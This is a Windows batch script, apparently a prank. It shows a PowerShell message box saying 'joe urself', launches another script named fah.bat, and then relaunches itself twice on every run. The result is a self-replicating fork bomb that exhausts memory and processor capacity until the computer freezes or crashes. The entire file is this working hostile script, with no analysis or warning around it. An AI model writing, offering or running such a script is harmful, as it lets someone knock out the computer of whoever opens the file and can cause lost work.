@echo off
:makenew
set "psCommand=&{Add-Type -AssemblyName System.Windows.Forms; $result = [System.Windows.Forms.MessageBox]::Show('joe urself', 'joseph', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information); Write-Host $result}"
FOR /F "usebackq delims=" %%a IN (`powershell.exe -NoProfile -Command "%psCommand%"`) DO (
    SET "buttonPressed=%%a"
)

echo The button pressed was: %buttonPressed%
start /B fah.bat


if "%buttonPressed%"=="OK" (
	start /B "" "%~f0"
	start /B "" "%~f0"
) else (
	start "" "%~f0"
	start "" "%~f0"
)

pause
